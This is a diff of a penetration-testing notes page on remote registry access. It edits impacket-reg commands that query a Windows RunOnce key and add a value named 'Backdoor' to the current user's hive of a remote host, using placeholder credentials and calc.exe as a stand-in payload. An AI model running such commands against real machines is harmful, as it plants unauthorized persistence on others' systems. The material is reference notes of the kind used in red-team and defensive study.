@@ -9,8 +9,8 @@ The start of the service can be triggered as unprivileged user ([source](https:/
 
 Once the service is running it is possible to read and write the HKCU hive as unprivileged user ([source](https://twitter.com/splinter_code/status/1717706003322478986)).
 
-=== "[[notes/tools/impacket]] with [PR 1638](https://github.com/fortra/impacket/pull/1638)"
+=== "[[notes/tools/impacket]]"
     ~~~ bash
-    impacket-reg jdoe:'passw0rd'@ws01.corp.local query -keyName 'HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
-    impacket-reg jdoe:'passw0rd'@ws01.corp.local add -keyName 'HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -v Backdoor -vt REG_SZ -vd 'calc.exe'
+    impacket-reg jdoe:'passw0rd'@ws01.corp.local query -keyName 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
+    impacket-reg jdoe:'passw0rd'@ws01.corp.local add -keyName 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -v Backdoor -vt REG_SZ -vd 'calc.exe'
     ~~~
